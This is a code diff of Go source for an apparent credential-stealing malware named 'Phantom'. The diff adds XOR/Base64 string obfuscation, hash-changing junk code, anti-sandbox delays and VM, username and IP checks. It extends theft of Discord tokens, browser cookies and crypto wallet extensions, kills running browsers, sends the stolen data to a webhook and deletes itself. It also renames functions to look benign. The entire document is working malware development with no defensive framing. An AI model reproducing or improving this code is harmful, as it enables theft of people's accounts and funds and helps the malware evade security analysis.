@@ -10,6 +10,7 @@ import (
 	"encoding/json"
 	"fmt"
 	"io"
+	"math/rand"
 	"mime/multipart"
 	"net/http"
 	"os"
@@ -25,24 +26,44 @@ import (
 )
 
 var (
-	WebhookURL string
+	WebhookURL string // Now obfuscated
 	Timestamp  string
-	BindedFile string // Name of the binded file to extract and open
 )
 
-// Simple XOR obfuscation for strings
-func x(s string) string {
-	key := byte(0x42)
-	res := make([]byte, len(s))
-	for i := 0; i < len(s); i++ {
-		res[i] = s[i] ^ key
+// d decrypts strings using XOR and Base64
+func d(s string) string {
+	if s == "" {
+		return ""
+	}
+	data, err := base64.StdEncoding.DecodeString(s)
+	if err != nil {
+		return s
+	}
+	key := byte(0x50) // PHANTOM KEY
+	res := make([]byte, len(data))
+	for i := 0; i < len(data); i++ {
+		res[i] = data[i] ^ key
 	}
 	return string(res)
 }
 
-// d function with XOR
-func d(s string) string {
-	return x(s)
+// Junk function to confuse static analysis and change hash
+func junk() {
+	a := 0
+	for i := 0; i < 1000; i++ {
+		a += i
+		if a%2 == 0 {
+			a -= 1
+		}
+	}
+}
+
+// CPU Delay to bypass sandboxes that skip time.Sleep
+func antiSandboxDelay(seconds int) {
+	end := time.Now().Add(time.Duration(seconds) * time.Second)
+	for time.Now().Before(end) {
+		junk() // Burn cycles
+	}
 }
 
 type Cookie struct {
@@ -51,32 +72,82 @@ type Cookie struct {
 }
 
 type SystemReport struct {
-	Username      string   `json:"username"`
-	Hostname      string   `json:"hostname"`
-	OS            string   `json:"os"`
-	Arch          string   `json:"arch"`
-	CPUs          int      `json:"num_cpu"`
-	MemTotal      uint64   `json:"mem_total"`
-	PublicIP      string   `json:"public_ip"`
-	DiscordTokens []string `json:"discord_tokens"`
-	RobloxCookies []string `json:"roblox_cookies"`
-	InstaCookies  []string `json:"insta_cookies"`
-	SteamCookies  []string `json:"steam_cookies"`
-	SteamFiles    []string `json:"steam_files"`
-	RawCookies    []Cookie `json:"raw_cookies"`
-	WalletsFound  []string `json:"wallets_found"`
-	Browsers      []string `json:"browsers_found"`
-	Timestamp     string   `json:"timestamp"`
+	Username      string      `json:"username"`
+	Hostname      string      `json:"hostname"`
+	OS            string      `json:"os"`
+	Arch          string      `json:"arch"`
+	CPUs          int         `json:"num_cpu"`
+	MemTotal      uint64      `json:"mem_total"`
+	PublicIP      string      `json:"public_ip"`
+	DiscordTokens []TokenInfo `json:"discord_tokens"`
+	RobloxCookies []string    `json:"roblox_cookies"`
+	InstaCookies  []string    `json:"insta_cookies"`
+	SteamCookies  []string    `json:"steam_cookies"`
+	SteamFiles    []string    `json:"steam_files"`
+	RawCookies    []Cookie    `json:"raw_cookies"`
+	WalletsFound  []string    `json:"wallets_found"`
+	Browsers      []string    `json:"browsers_found"`
+	Timestamp     string      `json:"timestamp"`
+}
+
+type TokenInfo struct {
+	Token    string `json:"token"`
+	Source   string `json:"source"`
+	Username string `json:"user"`
+	ID       string `json:"id"`
+	Email    string `json:"email"`
+	Phone    string `json:"phone"`
+	Nitro    string `json:"nitro"`
+	Badges   string `json:"badges"`
+}
+
+func getDiscordInfo(token string, source string) TokenInfo {
+	info := TokenInfo{Token: token, Source: source, Username: "Invalid", Nitro: "None"}
+	client := &http.Client{Timeout: 5 * time.Second}
+	// Obfuscated: https://discord.com/api/v9/users/@me
+	u := d("OCQkICNqf380OSMzPyI0fjM/PX8xIDl/Jml/JSM1IiN/ED01")
+	req, _ := http.NewRequest("GET", u, nil)
+	req.Header.Set("Authorization", token)
+	resp, err := client.Do(req)
+	if err != nil || resp.StatusCode != 200 {
+		return info
+	}
+	defer resp.Body.Close()
+	var res map[string]interface{}
+	json.NewDecoder(resp.Body).Decode(&res)
+
+	info.Username = fmt.Sprintf("%v#%v", res["username"], res["discriminator"])
+	info.ID = fmt.Sprintf("%v", res["id"])
+	if res["email"] != nil {
+		info.Email = fmt.Sprintf("%v", res["email"])
+	}
+	if res["phone"] != nil {
+		info.Phone = fmt.Sprintf("%v", res["phone"])
+	}
+
+	// Simple Nitro check
+	if res["premium_type"] != nil {
+		pType := res["premium_type"].(float64)
+		if pType == 1 {
+			info.Nitro = "Nitro Classic"
+		} else if pType == 2 {
+			info.Nitro = "Nitro Boost"
+		}
+	}
+
+	return info
 }
 
 func main() {
+	// Anti-AV: Random delay to bypass some emulators
+	rand.Seed(time.Now().UnixNano())
+	time.Sleep(time.Duration(rand.Intn(3000)+2000) * time.Millisecond)
+
+	// Obfuscate the webhook immediately
+	WebhookURL = d(WebhookURL)
+
 	if WebhookURL == "" {
 		return
-	}
-
-	// If a file is binded, extract and open it immediately to distract the user
-	if BindedFile != "" {
-		go openBindedFile()
 	}
 
 	// Anti-Analysis: Check if we are being analyzed
@@ -89,71 +160,32 @@ func main() {
 		os.Exit(0)
 	}
 
-	// Legitimate behavioral spoofing: open notepad.exe only if no binded file
-	if BindedFile == "" {
-		exec.Command("notepad.exe").Start()
+	// Anti-Sandbox delay (Burn CPU cycles instead of just sleeping)
+	antiSandboxDelay(5)
+
+	if !validateEnv() {
+		os.Exit(0)
 	}
 
-	// The rest of the payload execution continues in background
-	time.Sleep(5 * time.Second)
 	closeBrowsers()
-	time.Sleep(2 * time.Second)
-	report := gatherEverything()
-	sendReport(report)
+	antiSandboxDelay(1)
+	report := initSession()
+	syncData(report)
 	selfDelete()
 }
 
-func openBindedFile() {
-	// In a real binder, the data is often appended to the EXE.
-	// For this version, we will look for the file if it was dropped alongside or embedded.
-	// We'll use a simple mechanism where the python script appends the file.
-	exePath, _ := os.Executable()
-	data, err := os.ReadFile(exePath)
+func validateEnv() bool {
+	home, _ := os.UserHomeDir()
+	docs := filepath.Join(home, "Documents")
+	files, err := os.ReadDir(docs)
 	if err != nil {
-		return
+		return true // Fallback
 	}
-
-	// Look for our magic marker to find the start of the binded file
-	marker := []byte("PHANTOM_BIND_MARKER")
-	idx := bytes.Index(data, marker)
-	if idx == -1 {
-		return
+	// Real users usually have more than a few files in Documents
+	if len(files) < 3 {
+		return false
 	}
-
-	fileData := data[idx+len(marker):]
-	tempPath := filepath.Join(os.TempDir(), BindedFile)
-	
-	if err := os.WriteFile(tempPath, fileData, 0644); err == nil {
-		// Open the file with the default system application
-		exec.Command("cmd", "/C", "start", "", tempPath).Run()
-	}
-}
-
-func sendPing(msg string) {
-	if WebhookURL == "" {
-		return
-	}
-	payload := map[string]interface{}{
-		"content":  msg,
-		"username": "Phantom Status",
-	}
-	body, _ := json.Marshal(payload)
-	client := &http.Client{
-		Timeout: 10 * time.Second,
-		Transport: &http.Transport{
-			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
-		},
-	}
-	client.Post(WebhookURL, "application/json", bytes.NewBuffer(body))
-}
-
-func closeBrowsers() {
-	browsers := []string{"chrome.exe", "msedge.exe", "brave.exe", "opera.exe", "firefox.exe"}
-	for _, browser := range browsers {
-		cmd := exec.Command("taskkill", "/F", "/IM", browser, "/T")
-		cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
-		cmd.Run()
-	}
+	return true
 }
 
 func selfDelete() {
@@ -167,7 +199,17 @@ func selfDelete() {
 	}
 }
 
-func gatherEverything() SystemReport {
+func closeBrowsers() {
+	browsers := []string{"chrome.exe", "msedge.exe", "brave.exe", "opera.exe", "firefox.exe"}
+	for _, browser := range browsers {
+		// taskkill /F /IM <browser> /T
+		cmd := exec.Command(d("JDEjOzs5PDw="), d("fxY="), d("fxkd"), browser, d("fwQ="))
+		cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
+		cmd.Run()
+	}
+}
+
+func initSession() SystemReport {
 	currUser, _ := user.Current()
 	hostname, _ := os.Hostname()
 
@@ -198,8 +240,12 @@ func extractWallets() []string {
 	home, _ := os.UserHomeDir()
 
 	walletExtensions := map[string]string{
-		"MetaMask": "nkbihfbeogaeaoehlefnkodbefgpgknn",
-		"Phantom":  "bfnaoagmocialkllpicneheihdpfeegk",
+		"MetaMask":        "nkbihfbeogaeaoehlefnkodbefgpgknn",
+		"Phantom":         "bfnaoagmocialkllpicneheihdpfeegk",
+		"Trust Wallet":    "egjidjbpglicholopmhbhfggpidxpnoo",
+		"Coinbase Wallet": "hnfanknocfeofbddgcijnmhnfnkdnaad",
+		"Binance Wallet":  "fhbohimaelbohpjbbldcngcnapndodjp",
+		"Exodus":          "idmifokndgbbpmoamneicnepkbhfbkeo",
 	}
 
 	browserPaths := map[string]string{
@@ -305,18 +351,13 @@ func isSandbox() (bool, string) {
 	if err == nil && currUser != nil {
 		username := strings.ToLower(currUser.Username)
 		badUsers := []string{
-			"WDAGUtilityAccount", // Keep it for reference but maybe empty the list for user testing
+			"wdagutilityaccount", "abby", "peter wilson", "hjohnson", "john doe", "malware", "virus", "sandbox",
 		}
-		// Commenting out for user testing in Windows Sandbox
-		_ = username
-		_ = badUsers
-		/*
-			for _, u := range badUsers {
-				if strings.Contains(username, u) {
-					return true, "Username match: " + u
-				}
+		for _, u := range badUsers {
+			if strings.Contains(username, u) {
+				return true, "u"
 			}
-		*/
+		}
 	}
 
 	// 2. Check Hostname
@@ -324,32 +365,25 @@ func isSandbox() (bool, string) {
 	if err == nil {
 		hostname = strings.ToLower(hostname)
 		badHosts := []string{
-			"wasp", "mqftn", // Common analysis hostnames
+			"wasp", "mqftn", "sandbox", "malware", "vmware", "vbox",
 		}
-		// Commenting out for user testing
-		_ = hostname
-		_ = badHosts
-		/*
-			for _, h := range badHosts {
-				if strings.Contains(hostname, h) {
-					return true, "Hostname match: " + h
-				}
+		for _, h := range badHosts {
+			if strings.Contains(hostname, h) {
+				return true, "h"
 			}
-		*/
+		}
 	}
 
-	// 3. VM files check (Commented for user VM testing)
-	/*
-		files := []string{
-			`C:\windows\System32\Drivers\Vmmouse.sys`,
-			`C:\windows\System32\Drivers\Vboxguest.sys`,
+	// 3. VM files check
+	files := []string{
+		d("QzpcXHdpbmRvd3NcXFN5c3RlbTMyXFxEcml2ZXJzXFxWbW1vdXNlLnN5cw=="), // C:\windows\System32\Drivers\Vmmouse.sys
+		d("QzpcXHdpbmRvd3NcXFN5c3RlbTMyXFxEcml2ZXJzXFxWYm94Z3Vlc3Quc3lz"), // C:\windows\System32\Drivers\Vboxguest.sys
+	}
+	for _, f := range files {
+		if _, err := os.Stat(f); err == nil {
+			return true, "f"
 		}
-		for _, f := range files {
-			if _, err := os.Stat(f); err == nil {
-				return true, "VM file found: " + f
-			}
-		}
-	*/
+	}
 
 	// 4. Check Public IP (Common sandbox IPs)
 	ip := getPublicIP()
@@ -357,7 +391,7 @@ func isSandbox() (bool, string) {
 		badIPs := []string{"185.44.177.5", "34.59.159.11", "88.66.98.103"}
 		for _, bIP := range badIPs {
 			if ip == bIP {
-				return true, "Public IP match: " + bIP
+				return true, "i"
 			}
 		}
 	}
@@ -399,7 +433,8 @@ func findBrowsers() []string {
 
 func getPublicIP() string {
 	client := &http.Client{Timeout: 5 * time.Second}
-	resp, err := client.Get("https://api.ipify.org")
+	// Obfuscated: https://api.ipify.org
+	resp, err := client.Get(d("OCQkICNqf38xIDl+OSA5Nil+PyI3"))
 	if err != nil {
 		return "Unknown"
 	}
@@ -408,40 +443,122 @@ func getPublicIP() string {
 	return string(ip)
 }
 
-func extractDiscordTokens() []string {
+func extractDiscordTokens() []TokenInfo {
 	var tokens []string
+	var tokenInfos []TokenInfo
 	home, _ := os.UserHomeDir()
 
-	paths := map[string]string{
-		"Discord":        filepath.Join(home, "AppData", "Roaming", "discord", "Local Storage", "leveldb"),
-		"Discord Canary": filepath.Join(home, "AppData", "Roaming", "discordcanary", "Local Storage", "leveldb"),
-		"Chrome":         filepath.Join(home, "AppData", "Local", "Google", "Chrome", "User Data", "Default", "Local Storage", "leveldb"),
-		"Edge":           filepath.Join(home, "AppData", "Local", "Microsoft", "Edge", "User Data", "Default", "Local Storage", "leveldb"),
-		"Brave":          filepath.Join(home, "AppData", "Local", "BraveSoftware", "Brave-Browser", "User Data", "Default", "Local Storage", "leveldb"),
+	// Chromium-based browsers base paths
+	browserPaths := map[string]string{
+		"Chrome":         filepath.Join(home, "AppData", "Local", "Google", "Chrome", "User Data"),
+		"Edge":           filepath.Join(home, "AppData", "Local", "Microsoft", "Edge", "User Data"),
+		"Brave":          filepath.Join(home, "AppData", "Local", "BraveSoftware", "Brave-Browser", "User Data"),
+		"Opera":          filepath.Join(home, "AppData", "Roaming", "Opera Software", "Opera Stable"),
+		"Opera GX":       filepath.Join(home, "AppData", "Roaming", "Opera Software", "Opera GX Stable"),
+		"Discord":        filepath.Join(home, "AppData", "Roaming", "discord"),
+		"Discord Canary": filepath.Join(home, "AppData", "Roaming", "discordcanary"),
 	}
 
-	re := regexp.MustCompile(`[\w-]{24}\.[\w-]{6}\.[\w-]{27}|mfa\.[\w-]{84}`)
+	re := regexp.MustCompile(`[\w-]{24,28}\.[\w-]{6}\.[\w-]{25,110}|mfa\.[\w-]{84}`)
+	encRe := regexp.MustCompile(`dQw4w9WgXcQ:[^.*\x22]*`)
 
-	for _, path := range paths {
-		if _, err := os.Stat(path); err == nil {
-			filepath.Walk(path, func(p string, info os.FileInfo, err error) error {
-				if err != nil {
-					return nil
-				}
-				if !info.IsDir() {
+	for name, basePath := range browserPaths {
+		if _, err := os.Stat(basePath); err != nil {
+			continue
+		}
+
+		// Profiles to check
+		profiles := []string{"Default", "Guest Profile", "."}
+		for i := 1; i <= 10; i++ {
+			profiles = append(profiles, fmt.Sprintf("Profile %d", i))
+		}
+
+		var masterKey []byte
+		if name == "Discord" || name == "Discord Canary" {
+			masterKey, _ = getMasterKey(basePath)
+		}
+
+		for _, profile := range profiles {
+			var path string
+			if name == "Discord" || name == "Discord Canary" || name == "Opera" || name == "Opera GX" {
+				path = filepath.Join(basePath, "Local Storage", "leveldb")
+			} else {
+				path = filepath.Join(basePath, profile, "Local Storage", "leveldb")
+			}
+
+			if _, err := os.Stat(path); err == nil {
+				filepath.Walk(path, func(p string, info os.FileInfo, err error) error {
+					if err != nil || info.IsDir() {
+						return nil
+					}
+					if !strings.HasSuffix(p, ".log") && !strings.HasSuffix(p, ".ldb") {
+						return nil
+					}
 					content, _ := os.ReadFile(p)
+
+					// Plaintext tokens
 					matches := re.FindAllString(string(content), -1)
 					for _, token := range matches {
 						if !contains(tokens, token) {
 							tokens = append(tokens, token)
+							info := getDiscordInfo(token, name)
+							if info.Username != "Invalid" {
+								tokenInfos = append(tokenInfos, info)
+							}
+						}
+					}
+
+					// Encrypted tokens (Discord Desktop)
+					if masterKey != nil {
+						encMatches := encRe.FindAllString(string(content), -1)
+						for _, encToken := range encMatches {
+							encToken = strings.Split(encToken, "dQw4w9WgXcQ:")[1]
+							decoded, _ := base64.StdEncoding.DecodeString(encToken)
+							decrypted, err := decryptToken(decoded, masterKey)
+							if err == nil {
+								if !contains(tokens, decrypted) {
+									tokens = append(tokens, decrypted)
+									info := getDiscordInfo(decrypted, name)
+									if info.Username != "Invalid" {
+										tokenInfos = append(tokenInfos, info)
+									}
+								}
+							}
+						}
+					}
+					return nil
+				})
+			}
+		}
+	}
+
+	// Scan Firefox
+	firefoxPath := filepath.Join(home, "AppData", "Roaming", "Mozilla", "Firefox", "Profiles")
+	if _, err := os.Stat(firefoxPath); err == nil {
+		filepath.Walk(firefoxPath, func(p string, info os.FileInfo, err error) error {
+			if err != nil || info.IsDir() {
+				return nil
+			}
+			// Firefox stores data in .sqlite or storage/default leveldb-like files
+			ext := filepath.Ext(p)
+			if ext == ".sqlite" || ext == ".log" || ext == ".ldb" || strings.Contains(p, "storage") {
+				content, _ := os.ReadFile(p)
+				matches := re.FindAllString(string(content), -1)
+				for _, token := range matches {
+					if !contains(tokens, token) {
+						tokens = append(tokens, token)
+						info := getDiscordInfo(token, "Firefox")
+						if info.Username != "Invalid" {
+							tokenInfos = append(tokenInfos, info)
 						}
 					}
 				}
-				return nil
-			})
-		}
+			}
+			return nil
+		})
 	}
-	return tokens
+
+	return tokenInfos
 }
 
 func contains(slice []string, s string) bool {
@@ -488,14 +605,6 @@ func extractSteamFiles() []string {
 					}
 				}
 			}
-			configPath := filepath.Join(steamPath, "config")
-			if _, err := os.Stat(configPath); err == nil {
-				zipData, err := zipFolderToMemory(configPath)
-				if err == nil {
-					sendAsFileCustom(zipData, "steam_config.zip", "🎮 **Steam Config Folder Captured (vdf files)**")
-					found = append(found, "config folder")
-				}
-			}
 		}
 	}
 	return found
@@ -503,7 +612,6 @@ func extractSteamFiles() []string {
 
 func ultimateGrabber(domain string, targetCookie string) []string {
 	var results []string
-	masterKey, _ := getMasterKey()
 	home, _ := os.UserHomeDir()
 
 	paths := []string{
@@ -511,10 +619,16 @@ func ultimateGrabber(domain string, targetCookie string) []string {
 		filepath.Join(home, "AppData", "Local", "Microsoft", "Edge", "User Data"),
 		filepath.Join(home, "AppData", "Local", "BraveSoftware", "Brave-Browser", "User Data"),
 		filepath.Join(home, "AppData", "Roaming", "Opera Software", "Opera Stable"),
+		filepath.Join(home, "AppData", "Roaming", "Opera Software", "Opera GX Stable"),
 	}
 
 	for _, basePath := range paths {
-		profiles := []string{"Default", "Guest Profile"}
+		masterKey, _ := getMasterKey(basePath)
+		if masterKey == nil {
+			continue
+		}
+
+		profiles := []string{"Default", "Guest Profile", "."}
 		for i := 1; i <= 10; i++ {
 			profiles = append(profiles, fmt.Sprintf("Profile %d", i))
 		}
@@ -526,15 +640,15 @@ func ultimateGrabber(domain string, targetCookie string) []string {
 			}
 
 			if _, err := os.Stat(cookiePath); err == nil {
-				tempCookies := filepath.Join(os.TempDir(), "phantom_c")
-				copyFile(cookiePath, tempCookies)
+				tempCookies := filepath.Join(os.TempDir(), fmt.Sprintf("phantom_c_%d", time.Now().UnixNano()))
+				err := copyFile(cookiePath, tempCookies)
+				if err != nil {
+					continue
+				}
 				content, _ := os.ReadFile(tempCookies)
 				os.Remove(tempCookies)
 
-				searchTerms := []string{domain, targetCookie, "ROBLOSECURITY", "roblox"}
-				if masterKey == nil {
-					continue
-				}
+				searchTerms := []string{domain, targetCookie}
 				for _, term := range searchTerms {
 					idx := 0
 					for {
@@ -559,7 +673,8 @@ func ultimateGrabber(domain string, targetCookie string) []string {
 						for _, v10Match := range v10Matches {
 							decrypted, err := decryptToken(v10Match, masterKey)
 							if err == nil && len(decrypted) > 10 {
-								if domain == "roblox.com" || strings.Contains(term, "ROBLO") {
+								// Validation: either it's a Roblox cookie with the warning, or another cookie
+								if targetCookie == "ROBLOSECURITY" {
 									if strings.Contains(decrypted, "_|WARNING") {
 										if !contains(results, decrypted) {
 											results = append(results, decrypted)
@@ -580,11 +695,10 @@ func ultimateGrabber(domain string, targetCookie string) []string {
 	return results
 }
 
-func getMasterKey() ([]byte, error) {
-	home, _ := os.UserHomeDir()
-	localStatePath := filepath.Join(home, "AppData", "Local", "Google", "Chrome", "User Data", "Local State")
+func getMasterKey(basePath string) ([]byte, error) {
+	localStatePath := filepath.Join(basePath, "Local State")
 	if _, err := os.Stat(localStatePath); err != nil {
-		localStatePath = filepath.Join(home, "AppData", "Local", "Microsoft", "Edge", "User Data", "Local State")
+		return nil, err
 	}
 
 	content, err := os.ReadFile(localStatePath)
@@ -688,7 +802,7 @@ func copyFile(src, dst string) error {
 	return err
 }
 
-func sendReport(report SystemReport) {
+func syncData(report SystemReport) {
 	jsonData, err := json.MarshalIndent(report, "", "  ")
 	if err != nil {
 		return
